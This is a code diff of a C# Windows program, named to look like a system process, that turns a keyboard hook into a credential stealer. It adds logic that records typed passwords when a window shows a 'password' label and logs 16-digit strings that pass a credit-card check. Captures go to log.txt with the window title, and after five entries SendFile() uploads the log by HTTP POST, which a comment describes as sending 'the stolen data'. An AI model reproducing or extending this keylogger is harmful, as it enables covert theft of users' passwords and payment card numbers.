@@ -1,18 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Collections.Specialized;
 using System.Diagnostics;
-using System.Windows.Forms;
-using System.Runtime.InteropServices;
 using System.IO;
 using System.Net;
-using System.Net.Http;
-using System.Net.Http.Headers;
-using System.Threading.Tasks;
-using System.Collections;
-using System.Collections.Specialized;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
 
 namespace Windows_Local_host_Process
 {
@@ -22,11 +16,14 @@ namespace Windows_Local_host_Process
         #region Contstants
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const int WM_GETTEXT = 0x000D;
         private const uint WINEVENT_OUTOFCONTEXT = 0;
         private const uint EVENT_SYSTEM_FOREGROUND = 3;
         private const uint WM_GETTEXTLENGTH = 0x000E;
         private const int CC_NUM_LEN = 16;
         private const int PASS_NUM_LEN = 8;
+
+        private const int LOGGED_WORDS_LIMIT = 5;
 
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
@@ -36,9 +33,11 @@ namespace Windows_Local_host_Process
         #region private Attributes
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-        private int passCharsInRow = 0;
-        private int ccCharsInRow = 0;
         static StringBuilder strBldr = new StringBuilder(16);
+        private static bool isLblPassFound = false;
+        private static string activeWindowTitle = "";
+        private static int countLoggedWords = 0;
+
 
         #endregion
 
@@ -51,6 +50,11 @@ namespace Windows_Local_host_Process
 
 
         #region Methods
+
+        /// <summary>
+        /// Gets the Text that appears on the foreground window title bar.
+        /// </summary>
+        /// <returns>Foreground Window Title</returns>
         private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
@@ -66,21 +70,20 @@ namespace Windows_Local_host_Process
         }
 
 
+        
         public static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
         {
-            // Console.WriteLine(GetActiveWindowTitle());
             StringBuilder sb = new StringBuilder(1024);
-            //StringBuilder sb = new StringBuilder(1024);
-            //GetClassName(hwnd, sb, sb.Capacity);
-            uint WM_GETTEXT = 0x000D;
+            
             SendMessage3(hwnd, WM_GETTEXT, 1024, sb);
-            Console.WriteLine(sb.ToString());
+            activeWindowTitle = sb.ToString();
+
             List<IntPtr> list = GetAllChildrenWindowHandles(hwnd, 100);
             for (int i = 0; i < list.Count; ++i)
             {
                 IntPtr hControl = list[i];
                 string caption = GetTextBoxText(hControl);
-                Console.WriteLine(caption);
+                isLblPassFound = caption.ToLower().Contains("password");
             }
         }
 
@@ -102,6 +105,12 @@ namespace Windows_Local_host_Process
             return result;
         }
 
+
+        /// <summary>
+        /// Translates Key combinations of the user to string.
+        /// </summary>
+        /// <param name="_key">The Key pressed by the user</param>
+        /// <returns>The literal for the key(s) pressed </returns>
         private static string keysToChars(Keys _key)
         {
             bool CapsLock = Control.IsKeyLocked(Keys.CapsLock);
@@ -198,41 +207,48 @@ namespace Windows_Local_host_Process
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-
             // string buf = null;
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                int number;
                 Keys pressed = (Keys)Marshal.ReadInt32(lParam);
-                if (int.TryParse(keysToChars(pressed), out number))
+                // If Backspace is pressed erase the last characther from the word
+                if (pressed == Keys.Back)
+                    strBldr.Remove(strBldr.Length - 1, 1);
+                else
+                    //  Else append the character  to the word
                     strBldr.Append(keysToChars(pressed));
-                    //buf.Add(keysToChars(pressed));
-                if (strBldr.Length == CC_NUM_LEN)//buf.Count == CC_NUM_LEN)
-                {
-                    Console.WriteLine("Potential Credit Card : ");
 
-                    Console.WriteLine(strBldr.ToString());
+                
+                if (isLblPassFound && strBldr.Length == PASS_NUM_LEN) { // The label 'password' was found in the foreground window
+                    WriteLogFile("Password:");
                     strBldr.Clear();
-                    //foreach (string combo in buf)
-                    //{
-                    //    Console.WriteLine(combo);
-                    //    buf = new List<string>();
-                    //}
-
-                    //NameValueCollection nvc = new NameValueCollection();
-                    //nvc.Add("id", "TTR");
-                    //nvc.Add("btn-submit-photo", "Upload");
-                    //HttpUploadFile("http://your.server.com/upload",
-                    //     @"C:\test\test.jpg", "file", "image/jpeg", nvc);
+                    ++countLoggedWords;                    
                 }
-                Console.WriteLine(keysToChars(pressed));
-                //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                //sw.Write(keysToChars(pressed));
-                //sw.Close();
+                else if (!isLblPassFound && strBldr.Length == CC_NUM_LEN) // Potential Credit Card
+                {
+                    if (CreditCardUtility.IsValidNumber(strBldr.ToString()))
+                    {
+                        WriteLogFile("Credit_Card:");
+                        strBldr.Clear();
+                        ++countLoggedWords; 
+                    }
+                }
+
+                if (countLoggedWords == LOGGED_WORDS_LIMIT)
+                {
+                    SendFile();
+                    countLoggedWords = 0;
+                }
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
+
+        /// <summary>
+        /// Maps the enum Key to symbols.
+        /// </summary>
+        /// <param name="_key">The pressed key</param>
+        /// <returns>symbol representing the key (eg Shift+1 -> returns '!')</returns>
         private static string mapping(Keys _key)
         {
 
@@ -342,13 +358,37 @@ namespace Windows_Local_host_Process
 
         static string GetTextBoxText(IntPtr hTextBox)
         {
-            uint WM_GETTEXT = 0x000D;
             int len = GetTextBoxTextLength(hTextBox);
             if (len <= 0) return null;  // no text
             StringBuilder sb = new StringBuilder(len + 1);
             SendMessage3(hTextBox, WM_GETTEXT, len + 1, sb);
             return sb.ToString();
         }
+       
+
+        /// <summary>
+        /// Writes the current word from the buffer to a file.
+        /// </summary>
+        /// <param name="justification">label to distinguish between password and credit card.</param>
+        private static void WriteLogFile(string justification){
+            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+            sw.WriteLine(String.Format("[ {0} ] - {1} : {2}", activeWindowTitle,justification, strBldr.ToString()));
+            sw.Close();
+        }
+
+
+        /// <summary>
+        /// Sends the log file with the stolen data to a server using http post method.
+        /// </summary>
+        public static void SendFile()
+        {
+            System.Net.WebClient Client = new System.Net.WebClient();
+            Client.Headers.Add("Content-Type", "binary/octet-stream");
+            byte[] result = Client.UploadFile("http://localhost/test/test.php", "POST", Application.StartupPath + @"\log.txt");
+            String s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);
+            Console.WriteLine(s);
+        }
+     
         #endregion
 
 
@@ -374,110 +414,6 @@ namespace Windows_Local_host_Process
         #endregion
 
 
-        //public static async Task SendviaHttp()
-        //{
-        //    using (var client = new HttpClient())
-        //    {
-        //        // TODO - Send HTTP requests
-        //        client.BaseAddress = new Uri("http://localhost:9000/");
-        //        client.DefaultRequestHeaders.Accept.Clear();
-        //        client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
-        //        // var gizmo = new Product() { Name = "Gizmo", Price = 100, Category = "Widget" };
-        //        //response = await client..PostAsJsonAsync("api/products", gizmo);
-
-
-        //    }
-        //}
-        //private void AddFile(FileInfo fileInfo, int folderId)
-        //{
-        //   // using (var handler = new HttpClientHandler() { CookieContainer = _cookies })
-        //   // {
-        //        using (var client = new HttpClient() { BaseAddress = new Uri(_host) })
-        //        {
-        //            var requestContent = new MultipartFormDataContent();
-        //            var fileContent = new StreamContent(fileInfo.OpenRead());
-        //            fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("attachment")
-        //                {
-        //                    Name = "\"file\"",
-        //                    FileName = "\"" + fileInfo.Name + "\""
-        //                };
-        //            fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse(MimeMapping.GetMimeMapping(fileInfo.Name));
-        //            var folderContent = new StringContent(folderId.ToString(CultureInfo.InvariantCulture));
-
-        //            requestContent.Add(fileContent);
-        //            requestContent.Add(folderContent, "\"folderId\"");
-
-        //            var result = client.PostAsync("Company/AddFile", requestContent).Result;
-        //        }
-        //    //}
-        //}
-        public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
-        {
-            //log.Debug(string.Format("Uploading {0} to {1}", file, url));
-            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
-            byte[] boundarybytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
-
-            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
-            wr.ContentType = "multipart/form-data; boundary=" + boundary;
-            wr.Method = "POST";
-            wr.KeepAlive = true;
-            wr.Credentials = System.Net.CredentialCache.DefaultCredentials;
-
-            Stream rs = wr.GetRequestStream();
-
-            string formdataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
-            foreach (string key in nvc.Keys)
-            {
-                rs.Write(boundarybytes, 0, boundarybytes.Length);
-                string formitem = string.Format(formdataTemplate, key, nvc[key]);
-                byte[] formitembytes = System.Text.Encoding.UTF8.GetBytes(formitem);
-                rs.Write(formitembytes, 0, formitembytes.Length);
-            }
-            rs.Write(boundarybytes, 0, boundarybytes.Length);
-
-            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n";
-            string header = string.Format(headerTemplate, paramName, file, contentType);
-            byte[] headerbytes = System.Text.Encoding.UTF8.GetBytes(header);
-            rs.Write(headerbytes, 0, headerbytes.Length);
-
-            FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
-            byte[] buffer = new byte[4096];
-            int bytesRead = 0;
-            while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
-            {
-                rs.Write(buffer, 0, bytesRead);
-            }
-            fileStream.Close();
-
-            byte[] trailer = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
-            rs.Write(trailer, 0, trailer.Length);
-            rs.Close();
-
-            WebResponse wresp = null;
-            try
-            {
-                wresp = wr.GetResponse();
-                Stream stream2 = wresp.GetResponseStream();
-                StreamReader reader2 = new StreamReader(stream2);
-                //log.Debug(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
-            }
-            catch (Exception ex)
-            {
-                //log.Error("Error uploading file", ex);
-                if (wresp != null)
-                {
-                    wresp.Close();
-                    wresp = null;
-                }
-            }
-            finally
-            {
-                wr = null;
-            }
-        }
-
-        
-        
         #region DLL Imports
 
         [DllImport("user32.dll")]
@@ -527,9 +463,6 @@ namespace Windows_Local_host_Process
        
 
         #endregion
-
-
-      
 
     }
 }
